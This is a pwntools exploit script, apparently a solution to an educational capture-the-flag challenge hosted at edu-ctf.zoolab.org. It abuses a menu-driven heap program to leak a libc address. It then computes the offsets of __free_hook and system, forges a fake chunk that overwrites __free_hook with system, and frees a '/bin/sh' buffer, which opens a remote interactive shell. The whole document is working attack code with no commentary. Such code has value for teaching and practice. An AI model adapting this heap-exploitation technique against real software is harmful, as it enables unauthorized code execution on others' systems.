from pwn import *

context.arch = 'amd64'
r = remote('edu-ctf.zoolab.org', 10008)

# edit 0
print(r.recvuntil(b'> ').decode())
r.sendline(b'2')
print(r.recvuntil(b'> ').decode()) # index
r.sendline(b'0')
print(r.recvuntil(b'> ').decode()) # size
r.sendline(str(0x418).encode())
r.send('A\x00'.encode())

# add 1 
print(r.recvuntil(b'> ').decode())
r.sendline(b'1')
print(r.recvuntil(b'> ').decode()) # index
r.sendline(b'1')
print(r.recvuntil(b'> ').decode()) # username
r.send(b'AAAAAAAAAAAAAAAA')
print(r.recvuntil(b'> ').decode()) # password
r.send(b'AAAAAAAAAAAAAAAA')

# edit 1
print(r.recvuntil(b'> ').decode())
r.sendline(b'2')
print(r.recvuntil(b'> ').decode()) # index
r.sendline(b'1')
print(r.recvuntil(b'> ').decode()) # size
r.sendline(str(0x18).encode())
r.send('A\x00'.encode())

# add 2
print(r.recvuntil(b'> ').decode())
r.sendline(b'1')
print(r.recvuntil(b'> ').decode()) # index
r.sendline(b'2')
print(r.recvuntil(b'> ').decode()) # username
r.send('BBBBBBBBBBBBBBBB'.encode())
print(r.recvuntil(b'> ').decode()) # password
r.send('BBBBBBBBBBBBBBBB'.encode())

# delete 0
print(r.recvuntil(b'> ').decode())
r.sendline(b'3')
print(r.recvuntil(b'> ').decode()) # index
r.sendline(b'0')

# show
print(r.recvuntil(b'> ').decode())
r.sendline(b'4')
print(r.recvuntil(b'data: ').decode())
libc_base = u64(r.recv(6).ljust(8, b'\x00')) - 0x1ecbe0
free_hook = libc_base + 0x1eee48
system = libc_base + 0x52290

# edit 1
binsh = b'/bin/sh\x00'.ljust(0x10, b'B')
fake_chunk = flat(
    0, 0x31,
    b'CCCCCCCC', b'CCCCCCCC',
    b'CCCCCCCC', b'CCCCCCCC',
    free_hook
)
r.recvuntil(b'> ')
r.sendline(b'2')
print(r.recvuntil(b'> ').decode()) # index
r.sendline(b'1')
print(r.recvuntil(b'> ').decode()) # size
r.sendline(str(0x48).encode())
r.send(binsh + fake_chunk)

# edit 2
print(r.recvuntil(b'> '))
r.sendline(str(2).encode())
print(r.recvuntil(b'> ')) # index
r.sendline(str(2).encode())
print(r.recvuntil(b'> ')) # size
r.sendline(str(0x8).encode())
r.send(p64(system))

# delete 1
print(r.recvuntil(b'> '))
r.sendline(str(3).encode())
print(r.recvuntil(b'> ')) # index
r.sendline(str(1).encode())

r.interactive()